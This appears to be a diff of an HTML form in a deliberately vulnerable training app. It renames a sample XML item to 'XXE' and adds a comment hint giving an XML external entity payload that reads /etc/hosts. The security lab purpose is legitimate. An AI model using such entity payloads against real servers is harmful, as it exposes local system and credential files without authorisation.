@@ -27,13 +27,17 @@
   </item>
   <item>
     <title>Item2</title>
-    <link>GSX</link>
+    <link>XXE</link>
   </item>
 </info>
         </textarea>
         <input type="hidden" name="id" value="xml">
         <button class="btn btn-primary" value="sendBtn">-send-</button>
       </form>
+      <!--
+        Hints: If you want /etc/host, You will be happy by using 
+          '<!DOCTYPE name [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>' and '&xxe;' in somewhere.
+      -->
     </div>
     <script>
       //デバッグ用、Ajaxでもできた
